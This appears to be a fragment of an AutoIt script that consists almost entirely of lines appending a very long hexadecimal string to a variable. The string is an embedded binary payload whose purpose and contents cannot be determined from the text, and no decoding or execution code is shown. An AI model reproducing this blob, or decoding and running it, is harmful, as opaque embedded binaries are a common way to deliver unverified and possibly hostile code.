    $sHex &= "C5618200AB99D16D80F62DD669A33A9A515C1837C21D61B9D203BE4291476107EF82498F6D8D204062C41501AFFF5CA0921834133B0CD3C0901F5B852618585BC649E99243E1EA2C2866715C415472667B2CF5411F8BEEB810F63D8DA88B38C3C82DA44AC9183DB9E8302D306897379A045D01012CBFE28244D0AB3552A9D688480D41B0A1B703F527B0214F6C7B9D8C48527480E6384B4785513434E7B7755A5244122E3C0145A513A77AA795C6E438FFE32C80582A9F41953442A2818EA7F332751DBD1BADA922D411CF99C34CF2411B1040C8F1418A293F4040736A6C883C59411F27C36A62C3DD620666D5C023F13833C90CA93C53403966301E2615FB874C48A40DBB3BC17D3A145413290897504023E92CAC4C10A51EC6263603535F3D5AD486A2BD9B78ACD9152748CF3CF16623F0D1DF33B9200F8D4ED903A9546362582C07BEA4912C60B70532E085C4D140512159E0D8F5C99935EEC00325E0C3921CCF7DE07DC73B9308541B9DBC468543207FDF58DC30F1F72971680DA0B103D082E158800482D5308FF0440AE955BD296D91D2899194400963FA80D4B70D6C35483C134B1E49DB420ADC34CD99D6949489050402A02C10F54503CB0B703047140022BAA7B7293F2966F311371716CF41BE40EB1FC4797AA31BBDA44038A5B1E057CD413086A5B1D2C64934C07D3E21008CD7503483D27C9A7625C1403A75768689508848D689346348746245C5DB13E9D00713ACB4BBD781B3B9BF138575FFEC4B77511B1795170B004A454989C08815E2B729D50399A0323C167F010CC442DAEB5A8830A9F1F1E82BF77618819BE0D0930BB47F750C1301EEE3906B93894780AC3BB06AA5810C0D082A179571DCF187DC900017EDEB0F5B077101F73CF37642B4240809E3CBD45B54B6339E9A1AB10B0D05443CC284BCCF4444D3FE7643E3F92CFEFF841581780D1528EE6F7F740E275F0D19CA361BA59D5C9D962A6F942494FEA6E1C60DF517F839EA4C648CED43731D75249551DB961340D782C3118D4FC34A2E44E57F2B7C8FF1F18A0913732009DB3467E09E271CFE200AA475415E741A3320FE124D0C8E6FA85152C70B38C10187E5421344965A09ABE7EC295A16EAD41E41346F80045702CD5DCBC31D9792FF03E22CB3E096CB141817F728BB05D0588D181B8D3467B36C1593E1DBEB4CB96729828DA3ED057D4B66CBE5218B95E279E0C8E5E41A7C3C343059621246B9CBA1065AE9647D13410DCD3A76E1BB070C2515B13B83906AC613C145D4C172304F3D4EB85589FD4F87FA2026AE40C137753102A9C22AFFA308B0C1E4D63871EB16C9D05815740C999F74114DADF9F56C5CB171A7F76C7502D1D921041D77423064D544824B3C34B9AB0B0420C71A3B6FC0125A7A370B99227180"
    $sHex &= "814C09B5889DE33865B8114DF910751311064EDC17307510E36A31C218A51542D10F8340CF834A3DD9DAF938FB459A14C338183C30F860814067A104334C5EE340E97824750B40A9218D587840980682F93DA2D1B8036DC966BC92001E82AC0BC4D27F40034C01F14C0BCF508FD4444C130449BC7000A8051ADDD9E56290D3504C2959B8029654F2B44518F9230DFC8B82B818C904064558B53D667CF0E0A57424437418BC0A580D67314A0C889B1802D53867874232C56738296198691D3095381A4EC389BF7578B7746CAF20A78677746055A7E8FEE24D5C77E41C538B2710C31B44C56A09632AC034AA7165A69E8097B527E98AF564ED35466C4B87469711618122628D151C8D4696603851A55550E914528C17A501B52AB86FCDB9A452A90C080C440C975B521940082583925C483BEB2CB8383C809302E336CC486A44A280CA47CDE4A892AEF718B510D5DB612C3F2F7B1411387038070D0D6B0C7D0ADCAAC2404BBB4D78A481228BCE3463D258D541EF562299080F244EE3DA1D55A785435E16B3A11548D9A61B80FF1891528B0CBD079355CDE3022CAC386E1D3808AC145667132CDDC670DDED4B505C6C689B031ED2FF4D1781BB0461FEFF31A4A8AE605E11A35EA520CE1169973871610A41F175DC0B951741BCA32C13E2A28338A73CB50A58358F2FE018D40AB50611B4403056D95F83564D1B49491974722863FA3819CDC28C506375E98A2037CAF13D8844D115212C69D2113E300218815E3F7E1BA13A1BD680777DB4106270491723E80085525BB7744F15C027526D673320F24962943879A8EC2A75128917304B83152CABF19506A40A449C97E8218A755AE519A0B87501096C352B78A9380FFD4BF7858A8F10D943751E6B5E81546E557B1C7BA9151A21DF3B641B12143B0B8955BF1926A4E405E7754BEB18B10630525B9294BEC0C28C90AC0C7F20ED6349068C82ACC1698810182B305A0D814AC95F34491752D5140F20230732140000A9F310CB0031913BA9553B8DC3973254E2132D573098404A79FCFDB9686995955FAE5E26F4CBADCA115CB3465038C352C3BAB4468F3F4D4D42AE45DD23052B4963A737C08C2BD628D36630131370268333C0690821702B211B062260315DFF75888B48B52E382F1160C8414130E74BB5931801AF63EE56E280772D7972C5000D04D5341202050E754E275041BC8B97395C9F012041814155B111CA0B3111294067608BC845D3857C0042383C7D3D2F52430ECD323E94F6BC2557ED1A950C1657B1ED483709123C39AAC330388CB91367F8BA4D517510B1F7D9181870715301837E48314204B5F584D25097DE884F38E1A020EEA5088F3BE9CC9490973F752AB612D2708F65D07D1B3B203DC942407CC160F8C585EBADBA01EB39A00B"
    $sHex &= "D138017EFC060F142E90F53882BBB1649A8599973CC0296CDABDC1751645648749497CBFC4D16816C1B7DBD622452630B1D3BF41E643C07CFCF009E07CF6A7F91EC20521010C8AAC8AFAA7CF23D05237503C0A36FB611B9CABCF684420FB5995B5223D5A6929083C6E3FC07E3BAB496FAF07AADD63B57D03040EAA0EF7FE4FE929895235890416894C160406B5100A6B0308A4863295385D45CC203D627527055AB5414AC53F552AE160CDA7D3F188450191AB1C11B8CA1B75B1E119352EC16A3B4D12B06A2F75D07888AC3E8E2923312A9D45A011712DB6FDE3701569EFCD5117848B13D63422960956470740525A9175149349C638F1D534E514487A11CDBF985168611DC61413686362BA6F5EF57C01F87D9C629B008DB1840658B012A524057A38B8D2072C3DED09890406D6568A4919898A167EC6427C006322C00201359994B8C8407B9EE903A170B03B10A7FCE9421E48A69A7C1086B117ACED0BF66C495D157A2FB6E37F3C49F380893560A1C20EE36D3BEFE3D58005ABF59D4F94460CD04409544E26A98838383838925E86837D29B17B8C4459202369C1131FD937E2BA511D00AC5825158BC62DECD8554967866E622367E5FEA1E23E3E5DEB58B106F0224D643CAD1840B609B51DB526E927BB95009B1F0E85AB43022C4069070563032FEB1F6DE902F0BC75D9A60053C76D2D4D0009AAA955973B07F41149C9207523995624661E019C3BA7BDC536F06F835F048CE303E1E71C674587B42ACFDD426F93F020741C172BC3CC86F559B9B1237B6A2A96167B2969716B313DE395C4202EDF4390146C1AEF743006DBB0823D713B4BB808197161708BFC89B1CD4F83E20F8995F40E5590AAA701B62CD0E960780AE02FDBA0C21A74258BD524CC46D417DF1E452EC0581F1D75620A12F20250CB482E464C10D138515924E00CD268484CE09B10533F44B144EF3C97AE02945E7B130FD898D27B203B6F3037B995B16305914390E0001E872DBC51707C2443BFD8BE5E6A301169538730818B69406B25902A50572F0CD60CE00CDDB63AA88F54E8488D4C81406B601008D25B35744C817D1D38D361D210034079380DECFAB55B0911E5C36B04AC87A1422413A92585600BA0C03683B123FF0475D25CFB49CF50101D4814DD18D25C3418AE3297B469070D3F141C080CC6A398340C89502024E3C385E72435441FC205FAAD406344E79623E80A1DC03C19BF6B26013B57741D0E4228388D95103C7103525A1FC6EB0E14A59D4A5751207343F629E00017DF62D2106A15343C081E445D16309252E6009A2B10ECA76C38CCDD70237F24FF917F4F77751684A2B73B437486A3AFAE662324E279186B84481D8A2832129B4260C719C88E589AC334010C2726C477A9AC0C14BB485D4103780B21"
    $sHex &= "CA9A01D6848350BB27B58B954BA001A19845BD131F0403CE0338E90DB1303408588870F1D92B8C817C2E529942012708C22F341A184473038093F1C831892AF7C938B6AF598A2136DD4660EB2AFB5708C80065674656CC000821898A9D2D3134CD3751F0FD4BCAEEF20B858ABB0B881C016A75AD8776CBE5D26CECECECD10B88C28880521B272307146334343449654A2A3404342A930CC8300430301B35104B2B4D32537A6F773526764A27927DE4178B8DFE6D0858472A7C12DF8680C12B52165A436164EB71105593655250840D10E19686A8E00BBA8E927552FF851A0A75104F2A76312D07AB892774DC5380D2C50AE9A0A6511CD45F8D1B390073E7105BAB81D30B7B684F589B94D8290BDD82E0E595010BEAE938A9A712288F8057BB8E3C05E05580C0904C936F1E3C899BBA09293CA3000EF0DE7D23578C80CF4D18904F233CB1AD0F84403240D570B7D73412CF18E02F4AD7C22F53B566F993A067505B0DFB5E85E46C0D584D7439B20E821C780BC0924DEE1D0F6213804D9A41809575006E1C230F9CEE90BC684787318A00E416DD0BD45223F4C00095DC74265C411F1F8DB359D7AD11C72DD5109DC23448E3977140D352752813FD04232070749D109F08C0D89230AD108B41ABCBB717A5744DA5A70C540EA0156D8C80220280C561D1B04A88785D71B8023746E1C1B9593A32B057586420106D6F3853B78B73F2D42A5D62EDE9A153501C69D0F20EA53C8D2F798B4000639040BC230C0DF01D3BED8301E71355CE6C934219B40C85A1F6410ACF1BB7858C17D0B7953C740D9F0F85DEEF6D2931254C8D55B19D952BFCD4C0081758498FEE6C1352AB1803F0F6C2057BF1753009A4C9041E55EC4D3711020674018E3C16B2316BD01A7104C71DC4B76D75376F225BD3D181D60507017D03D8A258D1E3DC0D01D78AC03A0466918A83487AB9020A793887C84E29E5A405411443B9056A837B351804D60611864389125475698856F475F1065C2C9F25808FE10304263CAD6575192E9C8DD1EB5A23C275408F750E8BEBE69A16DBBD8F8A949F60EA888DE37CB695E375EA6AE8668100A07C1BDF9B4AE7DC4F5D512F6AB935B32F43020261085A91BC76605C6F013DFA06752EB3FC70AB04810BCD4C2402288459DA30A37615ED4495D15A8515C159E2251056A5A3912EA628B50189D430106B40124373025DD05BF01401AEECC55382C252446B856B7C0B2971CF6D24E992DE8D53123881B5B001CA75D74D2B589F4B79E5CACEC6DB978908E806351B8675E706D9A91D4B6116BB6DD8056C554238CB7708110B09943CEB125F0B426337DD88935841A9FF281C815E492740B92A28414D2F385C1CD6370B11AF38843B5624A5013C2345540AD7EF62EA267C4424F154FF9B0937995411"
    $sHex &= "E9C631D50B7F3B894CB9EDEDAFCD4B8DC267066BFCB558048AA59D80E3AFA8ED65018AC111A8F5B9A994CA65E4443820141C6193F57B4B474AB9D855B71B6F2805204DD604CD0D0CA1D5958A31E211F29414D4FE071C88845B3BC15E4AAE08BE387F5793F012DC916A60C9B58D40D440C69263EA836A48BD52300D28645F0166DBBC564859AB8BDF9E4A436171342C0CDC888554303B09E42B1042EB298D8D48091685B15929A9558805E12B5E95C22A25D13CFF59460D793C893102610419123B6C2349AC654B8EC8E522DC34244D86EA00B9301E2F38029E4A274E342804B0E8C660B32DAE4E9C09313023344230A9543414912081542A204C080D386C50817C6904D688118D914B89C0D8E41F8E98F58D47274C8C1AC402AF2744EC063201B57D357665A14AD18B57DB9A1460F535E4804CA514F0D3C5AE7183415848B1852C90CA452D34102AAD045A55214B501C4638A515A37AAB8338A34350343D8B185048DBD5091C4A1933D24D9A30A581A711D9CA95AC74D0FD2344BC4100E075218B2DE770A596C2576B94A556B8F34197044D9C726F0669449CD0ED98949AA53B45903CC70AA1F4C71361EF85521046C0711E91EE141A8623C06C4462C99D061F142A090B05AD03AB2425C6937E12FF93BF25286A55FC5222D6295BCDDD07E953CDAFEDCB8C201C104BF71204D26D2B91C755A48B0569C907779104166C2D5321524CE1A8F869CA54501348B498CC09A86B19960973B82281978A7973B99AB2D6444E0427F96C9EE77D066317063F8FBA6412F33E6DF33E65FD3666678806CFF66C9ECDE3681E716947C04EFB349BCD6A10D797726D80768006D93C9BCDCE775E7D23377E7ECDB339B281AD82DF8A0CC58FB3D96C9E8EFC9473967B97A391239B679802E099B29C09734236CF9D84F19E2BA2A8CF667364A321A510A6E9A81D7B79364736ACD4AF60B0AFD1CFB3D91CB279B3C1B40EBED39B234736B58A7ECFB6C1B7E848F36C36B8B58263A17939219B17B97174DC6DCE36DBD9296B0757813406665DBA65B339D96CBBA2BC58D8BE3E67F33CCF5C81A6CBC07AF36C369BFFC1A4C2BAC62689D9549ACDF0C76DC8C1C915D93CCFE685CB2CC2E0CE95D93CCFE6B0CF0228D1D01A6C369BE7497FD169D30C66359ECDB3D9D458D52C92D6CEFFCFE6D12EB7077799785EF067B37936792B666EE56F0E67F36C9E376970E0F7710EE7D93C9B257BFAE67C36221442958C0E3F9C2FAC9B1588AE8A4811646DB230640A4F147A6F0AEF45DDAF4D54007F214784F4CBE5620B02F42511E0114911B345D75378215D815A55DF6CA185835A6DC2B2AD1924FD30BA9C2D57C384CB7C1DA1645CA878BD01B9270D2F5F08890237934D7181170F459D6D6967668690E4257F004C1D132C9B0C53"
    $sHex &= "6002CBB860FEF156479DA470C0FE22062638F8906064747669376A9A769C868B5F2C08BC2015605C539D8A5805206140EB6D0285784CF41B417C9116969BF240420F360E36C07BB1B7A4C0CF898181829C450CF3330C96657522A282BCA2CC2F0C5288046593F35A34761A59A1A670B171819D7C704501780AF75807EC1E3C876821B71BCB7415691A0DE1D7F8A81F2B448108FC23515346B5B0C17F354210188DE260D412036751F82A081997E2006DE1E13547DF205561D5B670FD4B1C12CE29BBDB7C2F180CA93D11754146F0F7AA49BDFDF9057D304B580CED05EAD8429386A85B748D914C8B0DC8BD38EBAA35F921DC4051A17AC50251690BD06EA16A9A096263F817412D06D74FA072001AED836D9D6BEBF8198233EF8546EB1A20C7BFA4CE9750D337F46B36850D97CD52CCA66092C9C2AD9A20DF9AB05B048EA09B07420AD3FB5029E64406803A20E2EDDDA301203E0811D837AD402811DF00D2FB90130A11423CD93028B3E46395AC0CC79049024247BE690E0C3B021075C102F735DBD32DE1853D6AFFED57C2414D4AE39C29C3C9823141425A3B3EBE8E97E3849230C5B1E071C2A5B48143A29C82B55BF14F248AEEB4304FA28C264EB3F712CD3F1F9612352658073623C904DDB4EC2337EA63E0D1E2280CCB2996BDE93D2C9694C56408E304A1085BE07D4CF54C2891E874D5DC60E25158A0A2D4E6B270700729725856EB4558338176E4345A8283059A486DA0B0431D872D00DDF39BE48B47E409AF5E6BF92149ABCCAD05E0C1720DD0085AEBA7C03402C4042514B3A063132B4414B654D42C677FD8C61786BD57E1870FAF9BC2BA5DEB6F9DAEB64B123F55AF533BF6E85BB525742AE734045C013F0CBD6461E85B0CBF0C83A0763091E02446AF458B9F77119CC5B235CBA9DD5B4848318566F89A28ACFA89A1A18D0F1940D0749A4CA181A76E316010C0C02B01440C410647D4BE6463A52018ED98D0959421A76FC4A9B46E30D9EB17DE813CE47364070FE729ACD902655CB49498A3FFEB0BA202D3DA87514467D0E31E6624C2A27AA2C5539141ACD1CBA9EF355A58CBE98D4B42A50B0A0FC5B0F0D1141302DB065B6BD99B530BB80E1A57F4B28E5AC67EE91C1125A5C9A90C00E99B64C0BC0C5B2587E46809A555DC75448553D134E408EA2362191387C5E45D172E44E3E4858F0E5661616BC591ABD9B463F48846261B85C495007D93EB1B37741ADFC8322EA4E32BA37540E0E81448F28A2412C0F410227852961793A407867DFF4F4C930C4D4DCF518ED2861E0720AF04AB5B864E376B600D49664028B8D418029E741B4271C7EE8BB407B507C1D8D4EBBADED755A45FDC97B7B4A80F34C1392349492E6F09DAB6806F41B81A6CA780FBAD1A343B55A52163597F18EBD2EB"
    $sHex &= "B8A313B785B57833E0C3E961428720112BD6F05655119764AE83C6DCDCC1804C3244808908CC004E0504564A3B09A5CB493C7D209082902DE817B7715D064B201849E93280D9DB650023F8094714AC4960CB0B58ECC3C5514AC8B7020DB902B75D1B02DA296CE32229687C6E913C6AF76361B3016C2B4F6A01EA2D0D2B91A4B1D9D2217840C055C920A887DB5A2A1F2DBBF2550226B2A5572079908D00E9CD47088B4024A4077185A77C8618380301458B552C845B5308629102094168246C3B2891633621C123D78BDB5260EA330D4BEFA4AACCF853C5498FDC91182C05770852820EB0DD00038ED7510AAC1142F523DE8DD8C10F853B014D4234A41D968C6B45B850F535820C735F4F2AE57DD49823C04444EB1C1C0709B4D94FBC4CEB071154FCBC09E4D183D1935C9247400F1106088266A461C4533CC4C3B0E2320C73448489081A52684763551E0103C481835B144FC4A61CE6A613C4215A77BA84773B3C583EAC47643948345C501AD35AF027F40490A1C8B3AC5D02C7C35A8942E50408AD24380D40E9163B00A8580903AD1B1EE0D9C229A4C17CB844924B10E170741180350C3392225EAB2B362D0C5DA35B5FE4681AA93ADB64C213D25F07BD046A172C395B38DFAA431D1CB4F01376FD81EA5F13C65A9C890CD40030C664EC14AB6B1356486F93AF482F695D14D9EBE3C9E81469BCE45B8D468A710BFD052C60BDF174C204C3E0CFF8E026AD4D96ADC84419A73C2ABD68084B1A71E7362C43183A71ABA680EB26E5E85D5B98BC96F0348B149AD4D82A43F9B4C05A8235398D14282C0744D5DB80228E408674C40681FA337E42AB5C0422E04CCF208CFD1404B7516F07CB38310FEB3033C009B2B24B21324D85003DF40C490D26980F7C5A5A836DFF6975AA69730C01519C9696BEB3EB1C113003D826E38BAC7DEC1E0557A37DCAE6F45040104FD8954EF3549E98409854989EF60B121655B424B864024AAE83F2204742E500D018C4C8B10184CB8F0B485B4190656A030378684DC8C00461E64B8BD0004C809720BC7FF02C804AD4008317830C1C6B0D1009DD2D099BCAB4A5ED81331E71B084CA67A3B08B45B033506F0FAE3F239B1DB3481C0070EF0CAE79183803D4980EBA67427B5B27F0B10D88E9A0898BB03C61228677484EB02434032D9DD9810058C4456D3771C2C2EB687310C58CA4F5457413EDA9778071A503057D808D8D0A9294AE050E2600B0D989D1430CE20B801F2084466AB37D01420508DBF7D7E103884DAB1255AB02EC2DF8ABABC55E8A1832088112727634D3C26938EB3F41226EA8F72CEB333E2802811986212A8091EB59785528FBA416AC40B394EB2BB6748053D7C904429570544B40A4103C8C3D90184ABFA9A2E0D9172252498851491783794C8446"
    $sHex &= "19224C308E04C2DC9D8661D038197D088B4B07390591F50256B4ED0E4C1710506548F3B6D13BBB55D84894BA84880756F50E42FF1BC64148017B48480A96B4F88A7E2157BCCF1796F030C55204E470DBD27C1217FFEF288D141CAC51E1DDD2539A70EBD42708A4C3D2F3D2E101A01C8BC2F251018D972D7D69BD55A4F5137AAF46F6A0897310E13D1D1D672EA41DB1A84C2AA34069C2A57DD76FDD1491939D6B6A570D5ADF801832C9016A9187CA01EA801458E3EF0FB2B0E463770449BCA8208914B553C1600B6708DF00DA206089227EDB70D3F4D56F7C0112F1808AFD755B60149D23D35035042137052B8999868E1EC5BD091193ABEB980C11DF1956834FEB96C144DAC4F54B89017E3B9BE2A22903ECD3A4039B0E0AD926011F972940293A677C995E09C2693974FEA9FC44FAEB482C61F1D9AD541A095DE0D1E4A788E14FF473DC2E5CA40352438DC10B5643C497514520F11872F38469B5184D635138DBB082472232F416CA3B63EB744C14832014EC32858B00F70F7E86AC3BEB285DEB5D8D5C1D8211EC2990D210D4266FECD90036CB4123287714C3C3CB40D11183E0087519E9615BC045A09DE04A00C0662D2109B8C2D631E4B2AE26F51915DDF4C07DE8119B2815B2588E14DA261ED401529806CAB9DC6088F5439B0800582FD8C2BAF11E6DD826602D58C086BA97E45E648489178436F8D3044E73211A20A93497B67F522424F428311E4A7328DC560E2242274EEC3B8AB1BC172968F4680F3D50AF11C3E81E25087371E24A84E310766140B1770801BD713F8804FE68C7050ACBF32D322CF8A4137058A5DB5C9E749178F7FA597CCFE5F9DE8076354584168878D924F07C138C052D08D8BEF306F46F080702441720E0A50CEC54DB5F31FE1E01DCDBE2C980F940731508207361E8BFFD060FA5C2D3E078D033C080E11FD3E2C34E9B809D6250A3C23968E12D71E4F8DBB0BF5972F20F2C0424C9C337113004D9BFF9DEFE3C24586683E07F06F87F74D35920F0D9C0D954248FCCD7FE18DF7C2410DF6C068B168B44DE3CDE2F6DBDFDE985D2791ED9988B0C2481D080814E498DA9C13C704CD9F65A20BEEB2C3B2F4DED9A91D8DA1411F7C20804CEEE7FB8D95CA6071C9F0DDE7CE416ADD0D3FAC2C1FA1FA1F856C102BBC3101AF5FF4903C1E95FEAEAFFE84A92C0E053566091786490E614100CC88B5C04D248122F2470544821188C0CD2929114100C30A4088C5EA619B943221F5318E490082C1B5448041E34EB50FF9EDBDB0CC814910810D70C0E5648047E087608F72E514804F3F940284C02EB88B84288DF75EA157B5570068196C4A665EB0C4676EC8A9FBC1D7E637C5975F139593AA78FC0AE78B846463489BC7305CDF67F098A068A09880E468A0E8810C18A843AF3"
    $sHex &= "1EA540E05E384DBFC9C3BD6168C0E5DAF65F91ACEEF05CCA9695128A123ACA6C57FCDAB3402E86F50A403636EB0B6065740CF8170D6B084533EF6C4880383074FA8B8E6BF7FF2703538A183A195B7501488A0A40428845F68058DFA1E01E5E03D9EEE8DC185C30812F9D771A049C4E5151754E03117F0D7419209F037D26ACA96989F594A632A1263008C0DB30A3782A6155081150F46908741CF306F812A4F00326B090CE2EEDEDBE5B5603F715037C3C5E71651E2617FBF70159595D25747D41741A8A3C57801C22041681FF8533F63BDE752B430C0E93FF5F5656565656893803016DDB15788BC7F2FA1D39A876D0080C7E66A2314C5B02920B7CB6E0C00939A277098722EBBA801AFD6C204B1C364E0F9FC07F48C666303A2D9EF803CB08AFBAC18BC1B16E8B7D303F2D8BF3FE12DF64D4032D8D7301FA7E188D46011E2570283A0EDA78800401C72F31008A002670D89A95FA451803E203F0C69B21ACA2F483CB422BDE13F84BC0035D8678E4538081C30C4133DBFD8A1F8D234E02395D2203C606458B4713BDB5102CEF2E1004487905A026C2DF21622D46147C0A996A645FF749E5994482681E0A0A1E8340C1002AF61CF001C3C9FF2B04803930750F6A038D410150510C4B565904068D33751904B7081AC28602EE0CCC5E561278593AC4840F04CF64B10705756C503BFB02061E548C8DBF202974E98C103B6F9180E8C376E1DA0E5B9F0001B9149D61DBE1E2D4B32BC1143BF3D410DBB7B8C0ADE00151503239C0353FEB58EA03C7031AEEF9A2947404884F5FDFE31FEB191745D45350FF7EC7B410083CA9163BB3B258D1EFA22D0C05F9FF3BBEC004119F58FA22C21DC771BD24BBDC4907B0E456E4332B7E982FC030D739E87D034E9380B589088B784872F9B1922BE9E8E44A80F9E7C6FE81397D10493A2A7AD50B6000DC10023C4902E50BB078593AA29CC1E9810D57E314BAFF025323CAA23BCA9ED4FE10AF85DB0E884F4F82801D77040B10C035F80E83FE9D365E0250535791F2742E87219DFFC8C0142C92E30C6185CDC3DE0980803B2D765F0630466AD17FF8E46A65BAFEC824E00478464656996FC0D4D97CD6AE4C29D7FFC24334FEC980E1E080C170A61861B7043E91712578FE9C30A12ACE9D8B5D18C73F6DE0A34A9B8B4F0446F7DB1B28FFC5A654E3145AF07F9AC32733D20BC1751D5A82BB21583CE6EE0FE1D2D213382405260D18D8BCE7E6FEEBA831C646914681AAC039086488130C035AD3DCD709147F008D4D5A2877083B25C16C9486B5EDD58461AC0F514C579F34A4C40423B418FC61D9428623C422346D180D0D8D6680307ED257C1887A39760203C3926DFC0493F9BF0D704A0FACC804C1E90446FF4D143640FB7D8B36C87DAD197C51A7F64D57D7F8B6"
    $sHex &= "3108FF80F9667405086884ADAF463E0098EE77B92F1B3C142DA20780C3075708FE3A8818EB09FEC18E8EFE40FF55EB4EE08B11966A3056650352482A331464D206CF306CE19A13B134BB7007F7E878070846E74A255F23D32BDF9AFE0D7A53591BD1780C7F043872EC062B46EB0A1FFE5D163D4613D3F7DA3BD38BFEF07C24FF3C0D011746C172195351672C7E815290060C0430FEC01BD0A800C4D3B2AF6A133264CA05AC5BFB02A57246644B48C973E5DA464B1F0A72180A30AD701F895DF0199001002758874960A1A8E8C215A314C073A6F908B44F15B04ED785262D4002E3B4EF66A8C09A15AFC64F963DC2FF777476CD327E3B03448F55407513E2E0E82D490BD7C67208C1C28B6FEC208BF724072DB0455577008B4304BC47DA7F0D8261024616A789025B052E479644294EF4E889938B5B04D07D26B6D30698EB4570395D0C7C24082E68C02A6E61578BB3305C91015A350B2467401AABDA99210D7894C8CEA3703E31A020509115FF751818706E1F848BCF3806FE858917720476C7FFB875308B1FC9C8E6750C575F57D0F3751B5761C825381E07012234E80B5226CB76DE6248AAD240018445D08D150D1A680CF9A1C9242BF8318488C842485157E0A6FB206D1EEB586D390F9CC17F6808B8FCFC7C2D06283ACB740A1EF7C0FF8A074784C075F9885FFE43D06A01C7083B0483CEBAB7EB1C335F1DB81E79C63E7DCDFEF873FB05267EF865745F0845745AEBC075606675FA20769DB9595BC2FF7CE54461741E572536B241741C4B5E37EB30B0921F603106FB12EB17223CC28A4D8D1C93C20934849431D8DD03003ADB68AA0856621012E004295CC53281EBD55EDA83D6509F188FF8DD9F9480A75C11656D5F26F0E8DC75F0926D165DF8CA278E6502F86405269A8099C9067C20C991CA791C887900A10B78F14AD0C3C20207BF52EA1747D608D0C9FFF2AE6E2A1817C9ACEF018A2A6841087F1AC70138072D02498E43E13A00E32834A3D11EDD08574B7D8CDC381634A12AD4CA02367ABB571BD706B09164BD11DF4FA56619BB561907575EF6416703DA5C752B7738C6E4F647001F6A0358EB2F2A02751CA45DBB0F04EBE86056EA0A36CE388F63B5943FADFC41C829204F0C9B048C4A720558C1C03782598B790CA840026F56C1E0015E847E04B3C676DD6093234825E27E0468EAA12CD740508104AE700EBB6F860136C43E82047E1A8A0FBFCBB05606E2C947EB036A30ECFF6EFB598808404A387FE9F086187C12803F357C0D340BFEFF133480383974F7FE00803E317505FF4196158D841B73E37E01574F574BC35A2007774B08A8F01363538BC856574E42277486D9BF09CF10DB97E164EE123ED9BE00FE7BE148254375FC85DB74133BDF74B52E1C922A3CC2285C7FA097"
    $sHex &= "41E00C2429129F5320B026750E3789580489691338ED18EB4C4C013FC3DF7EDAB7F98BCAC615C1E00B0BC80B964CC1E20B401BBF410A891085CE751F6067FFFFF9D903D2C1EB1F0BD303C981C7DE6E26602BF8DE2085D674E1A00BCF70665E085B920C1C307B143FC8473B3C5614D0200804B859598DB874490BCFD015DFAF727A108BFCA5A566A53418D76ED0A3D92FD289435045D689030FBF4A180404EEC6CB971C8324FF6355C9290C89730C5E8BC38655CA1E17F9F91FC826F057FA5533FF33ED0B7D1547452B398A12E52891292C029518E884099C1805B9B0080494105F254573181C68B14D7907102A2C029BA58F1326495D5E5F716D0158D3DBC05774FC18F7FF2368F79AFCF0FC7431047EC03F0DF63BFE740B28072329581D5A930493FDC3E946595FEB1D66D00C85F674094518D8FE5F8906EB0571892D00571D2CC171490815B6D905B7A67D907048060AE002300081E31880C21EFB81EB023F04052C1410578581FB01099E4D004427BC0D00F80EEC5C85E0750D5BD713F8BA7CF4E82C580C8D7DB68EFFFEE0ABAB6A02AB581F836508005634E02AD4A5D8A0D5DA008B3562984E6E8BC1D99F4E1B541F058BD1811200319438080E84DBF69E223DE0428D7CB46A1F9A592B46038BF1CA40D3E0AE85070D3129A059443EFF0E2EE20AEC855444B08350486DA7850709F3B8C6996C5904BEB9DF23D1B381E6AFA24E83CEE046DB2A1E5A862BCEF442768D4C66FE26997D8B3103F2896E0CD07222395508EB1BFFDC8A32304B3D118D7201DC4CDC7E3E3BF272C4FE01738F48048B3E600B4E79D1281638F420EC403E2107A0001B0C2C057D0DFA59C12FB1D9772BC8F3ABD8740143A1EA06DB60C594EA2B0DFB3BD9484B4E83F8E1AB440AF33B640DA697AC0F86AC50D4414386674C34A5395ED18BB06043A5E2A53140F4003F073BEEA983CFFF9AD3E72C202955FCC1478BC0F7D7C45C9D744173E975338BCEC4F43EEE52145759D10B6C89243AD3E6FFE05798450F2203898E7CD346C1E602DC5001180C5A2A3BD07CC0CC0E3F12897495A16495D48A2A8A1260A0E761C56114895BE44E017C6606B55CF4851348AE288ED955668F426016E89A2C558D3C5869F1A216FE72043BFA0F0889391AC55321B2641F1E5DBF1943E13E5B036289318BCF48792690918ADE44F0038BD610822D299C41BDE332D9801AE146B0F704077F73573B1D30903D0F8CADE67840351C6B8142688E60082065A14FA4031394A6B8E67D821FC0BB2BA48165E01803D857C02595ABCEE6D69BE082574A7C8D56CF23CE53EF2204839DE00B7D52297DF06CB6099066085D7DD0F0839101045DAFD3E3612004233AAD5EC6FFE0800BD98DA00B5DE083F940F665AB7E2426895904E2EB0A224EF804310A"
    $sHex &= "F6195F4A400E110387119C402553F2119CB090133232ACB01037A122192AB0A91C0A90B4119BA82A430552B4A8BC5120CF41119BBC11C80132B4B874C5A0D47C4F765633F62CDA7710D50C4633C957129062A6B58602AE8C9A980AB404A8FCA6699AA4A09CB094395D24751FB060900861BC97A91DA31897FBAC8A023CFEFF2B2CA03C0974083C0A74043C0D750342EBEBB330B120A0C12C80F91CDF96224C2F385EAB8AC880E92F481DFD3180F9087706CE4ACC248B87892B8009B13AC87C23487D6A0559EBC74A83E82B741DA0363764A6D6E803D3049E1AFDCEEBAE8181071AF58C1C94BE82F75965101EEB99A788A8AC76A9BF6DD2D0A1043CAD3C96283C2D74243A54DA7FFFC374B93C430F8E3C9C3C457E103C63163065F724A402C8280BEB814A8F87E0C16A0BB2129C530F86524A0D25D762AD7EE883CFE09A9C0E66390264146A068A1B61FDEB1A3C397F1ADE19730AFAEDD04CFAB42AC388070412B0165C7D9E8373B4E28F5D3C8985B3BFDDEBEFFB76009004A47526EB06FF4D737461412EEFF6EB18B2D50B3BAE4171F67DE4EBBB206404DA6EA2A022DE09E897858D4AFE149E1BDEC7E7076A092DBD2010DB7ED05D3B6508ED834D98140759170482F6AC660E25AEA0840B0EAB68F8F92C313CC8B87028A976AB5AD650D82CEBBD4747AFE8FF1B92E97D74C2BAB2A2163C00C0106A10D4D903FF820794D45839787610807DF7057C03480CEBF0FE45F74F3643E1F80A68D2DEFA596A0A32DD8554D06E0A2CBC26BEFC40B40F165AEB19FA206BC92ABED8497C875431D081F950987F09AC5B6C24FDD4B9511E1B54D827AA0B50985BA035F06B6831F1333F50B4CE4F803F852A69404A1EC488CAFA8352B4AB072640FDA3B41A9C33623955987D02344DD40E72B012A0820E18A4E983E6DE2B451C3DD7A8223A3DB0EBA860F576A28C2E14B918DEE96317506D8CACFA84E9DC7D764CCE0D7E2C0220263276107008780666E209574F6B14AC44C6